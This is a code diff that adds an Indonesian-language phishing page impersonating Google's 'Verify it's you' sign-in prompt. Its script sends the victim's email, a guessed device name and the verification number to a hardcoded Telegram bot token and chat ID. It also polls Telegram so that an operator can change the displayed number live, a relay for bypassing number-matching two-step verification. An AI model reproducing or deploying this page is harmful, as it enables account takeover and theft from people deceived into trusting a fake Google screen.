@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi diri Anda</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#fff;
+    color:#202124;
+}
+
+.container{
+    max-width:360px;
+    margin:auto;
+    padding:20px;
+}
+
+.logo{
+    text-align:center;
+    margin-top:8px;
+}
+
+.logo img{
+    width:100px;
+}
+
+h1{
+    text-align:center;
+    font-size:26px;
+    font-weight:400;
+    margin-top:20px;
+}
+
+.desc{
+    text-align:center;
+    font-size:14px;
+    line-height:1.5;
+    margin-top:20px;
+}
+
+.desc a{
+    color:#1a73e8;
+    text-decoration:none;
+    font-weight:500;
+}
+
+.account{
+    margin-top:22px;
+    border:1px solid #dadce0;
+    border-radius:22px;
+    padding:10px 14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    cursor:pointer;
+}
+
+.account-left{
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+
+.avatar{
+    width:32px;
+    height:32px;
+    border:2px solid #5f6368;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.avatar svg{
+    width:18px;
+    height:18px;
+    fill:#5f6368;
+}
+
+.email{
+    font-size:14px;
+}
+
+.arrow svg{
+    width:18px;
+    height:18px;
+    fill:#5f6368;
+}
+
+.number{
+    text-align:center;
+    font-size:80px;
+    font-weight:300;
+    margin-top:70px;
+    line-height:1;
+    cursor:pointer;
+    transition:all 0.3s;
+}
+
+.number:hover{
+    transform:scale(1.05);
+}
+
+.number.updated{
+    animation:pulse 0.5s ease-in-out;
+    color:#1a73e8;
+}
+
+@keyframes pulse{
+    0%, 100%{transform:scale(1);}
+    50%{transform:scale(1.1);}
+}
+
+.status{
+    text-align:center;
+    font-size:12px;
+    color:#5f6368;
+    margin-top:10px;
+}
+
+.status.online{
+    color:#34A853;
+}
+
+.device-title{
+    margin-top:40px;
+    font-size:18px;
+    font-weight:600;
+}
+
+.device-desc{
+    margin-top:18px;
+    font-size:14px;
+    line-height:1.5;
+}
+
+.help{
+    margin-top:30px;
+    font-size:14px;
+    line-height:1.5;
+}
+
+.help a{
+    color:#1a73e8;
+    text-decoration:none;
+    font-weight:500;
+}
+
+.link{
+    display:block;
+    margin-top:60px;
+    color:#1a73e8;
+    text-decoration:none;
+    font-size:15px;
+    cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    </div>
+
+    <h1>Verifikasi diri Anda</h1>
+
+    <div class="desc">
+        Untuk membantu menjaga keamanan akun Anda,
+        Google ingin memastikan bahwa memang Anda
+        yang mencoba login.
+        <br><br>
+        <a href="#">Pelajari lebih lanjut</a>
+    </div>
+
+    <div class="account">
+        <div class="account-left">
+            <div class="avatar">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+            </div>
+            <div class="email" id="userEmail">Loading...</div>
+        </div>
+        <div class="arrow">
+            <svg viewBox="0 0 24 24">
+                <path d="M7 10l5 5 5-5z"/>
+            </svg>
+        </div>
+    </div>
+
+    <!-- Number bisa diklik untuk verifikasi -->
+    <div class="number" id="verifyNumber" onclick="verifyCode()">10</div>
+    
+    <div class="status" id="status">🔄 Tersinkron</div>
+
+    <div class="device-title" id="deviceTitle">
+        Periksa perangkat Anda
+    </div>
+
+    <div class="device-desc">
+        Google mengirimkan notifikasi ke 
+        <span id="deviceName">perangkat Anda</span>.
+        Ketuk <b>Ya</b> pada notifikasi, lalu ketuk <b id="codeNum">10</b>
+        di ponsel Anda untuk memverifikasi diri Anda.
+    </div>
+
+    <div class="help">
+        Butuh bantuan?
+        <a href="#">Pelajari lebih lanjut dialog Google</a>
+    </div>
+
+    <div class="link" onclick="resendCode()">Kirim ulang kode</div>
+
+    <div class="link" onclick="tryOtherWay()">Coba cara lain</div>
+
+</div>
+
+<script>
+// ===== KONFIGURASI =====
+const CONFIG = {
+    botToken: "8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk",
+    chatId: "7549590022",
+    storageKey: "verify_code", // Kunci di localStorage untuk sinkron
+    pollInterval: 3000 // Polling setiap 3 detik
+};
+
+// Ambil email dari localStorage
+const email = localStorage.getItem("userEmail") || "user@gmail.com";
+document.getElementById("userEmail").textContent = email;
+
+// Fungsi deteksi perangkat
+function getDeviceName() {
+    const ua = navigator.userAgent;
+    const devices = [
+        { name: "Infinix HOT 50 Pro+", keywords: ["Infinix HOT 50 Pro+", "HOT 50 Pro+"] },
+        { name: "Infinix Zero 40", keywords: ["Infinix Zero 40"] },
+        { name: "Tecno Camon 30", keywords: ["Tecno Camon 30"] },
+        { name: "Oppo Reno 12", keywords: ["Oppo Reno 12"] },
+        { name: "Vivo V30", keywords: ["Vivo V30"] },
+        { name: "Xiaomi Redmi Note 13", keywords: ["Redmi Note 13"] },
+        { name: "Samsung Galaxy S24", keywords: ["Galaxy S24"] },
+        { name: "iPhone 15", keywords: ["iPhone 15"] },
+        { name: "POCO X6", keywords: ["POCO X6"] },
+    ];
+    
+    for (const device of devices) {
+        for (const keyword of device.keywords) {
+            if (ua.includes(keyword)) return device.name;
+        }
+    }
+    if (ua.includes("Infinix")) return "Infinix";
+    if (ua.includes("Tecno")) return "Tecno";
+    if (ua.includes("OPPO")) return "Oppo";
+    if (ua.includes("Vivo")) return "Vivo";
+    if (ua.includes("Xiaomi") || ua.includes("Redmi")) return "Xiaomi";
+    if (ua.includes("Samsung")) return "Samsung";
+    if (ua.includes("iPhone")) return "iPhone";
+    return "Perangkat Anda";
+}
+
+const deviceName = getDeviceName();
+document.getElementById("deviceTitle").textContent = `Periksa ${deviceName} Anda`;
+document.getElementById("deviceName").textContent = deviceName;
+
+// Ambil kode dari localStorage (atau server)
+let currentCode = localStorage.getItem(CONFIG.storageKey) || "10";
+document.getElementById("verifyNumber").textContent = currentCode;
+document.getElementById("codeNum").textContent = currentCode;
+
+// ===== FUNGSI POLLING - CEK UPDATE KODE DARI SERVER =====
+async function checkForUpdates() {
+    try {
+        // Cek ke Telegram API untuk melihat pesan terakhir
+        const url = `https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?timeout=1`;
+        
+        const response = await fetch(url, { method: 'GET' });
+        const data = await response.json();
+        
+        if (data.ok && data.result.length > 0) {
+            // Ambil pesan terakhir
+            const lastMsg = data.result[data.result.length - 1];
+            const text = lastMsg.message?.text || "";
+            
+            // Cek jika ada perintah_SET kode baru
+            if (text.startsWith("/set ")) {
+                const newCode = text.replace("/set ", "").trim();
+                // Validasi: hanya angka 1-6 digit
+                if (/^\d{1,6}$/.test(newCode)) {
+                    updateNumber(newCode);
+                    // Hapus pesan dengan membalas
+                    await deleteLastMessage(lastMsg.update_id);
+                }
+            }
+        }
+    } catch (error) {
+        console.log("Polling error:", error);
+    }
+}
+
+// Hapus pesan terakhir dari Telegram
+async function deleteLastMessage(updateId) {
+    try {
+        // Ambil chat ID dari pesan
+        const url = `https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?timeout=1`;
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        if (data.ok && data.result.length > 0) {
+            const lastMsg = data.result[data.result.length - 1];
+            const chatId = lastMsg.message.chat.id;
+            const msgId = lastMsg.message.message_id;
+            
+            // Edit pesan menjadi "-" (dihapus)
+            const editUrl = `https://api.telegram.org/bot${CONFIG.botToken}/editMessageText?chat_id=${chatId}&message_id=${msgId}&text=-`;
+            await fetch(editUrl);
+        }
+    } catch (e) {
+        console.log("Delete error:", e);
+    }
+}
+
+// Update nomor dan simpan
+function updateNumber(newCode) {
+    if (newCode !== currentCode) {
+        currentCode = newCode;
+        localStorage.setItem(CONFIG.storageKey, newCode);
+        
+        // Update tampilan
+        document.getElementById("verifyNumber").textContent = newCode;
+        document.getElementById("codeNum").textContent = newCode;
+        
+        // Animasi
+        const numEl = document.getElementById("verifyNumber");
+        numEl.classList.add("updated");
+        setTimeout(() => numEl.classList.remove("updated"), 500);
+        
+        // Kirim konfirmasi ke Telegram
+        sendToTelegram("✅ Kode verifikasi diubah menjadi: " + newCode);
+    }
+}
+
+// ===== KIRIM KE TELEGRAM =====
+function sendToTelegram(customMessage) {
+    const message = customMessage || `🔐 Verifikasi Google\n\n📧 Email: ${email}\n📱 Perangkat: ${deviceName}\n🔢 Kode OTP: ${currentCode}`;
+    
+    const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(message)}`;
+    
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok && !customMessage) {
+            alert("Kode verifikasi berhasil dikirim!");
+        }
+    })
+    .catch(error => console.error(error));
+}
+
+// Verifikasi saat klik angka
+function verifyCode() {
+    sendToTelegram();
+}
+
+// Kirim Ulang Kode
+function resendCode() {
+    const message = `🔄 Kirim Ulang Kode\n\n📧 Email: ${email}\n📱 Perangkat: ${deviceName}\n🔢 Kode: ${currentCode}`;
+    sendToTelegram(message);
+}
+
+// Coba Cara Lain
+function tryOtherWay() {
+    const message = `🔀 Coba Cara Lain\n\n📧 Email: ${email}\n📱 Perangkat: ${deviceName}`;
+    sendToTelegram(message);
+}
+
+// Mulai polling
+setInterval(checkForUpdates, CONFIG.pollInterval);
+
+// Status koneksi
+document.getElementById("status").innerHTML = "";
+document.getElementById("status").classList.add("online");
+</script>
+
+</body>
+</html>
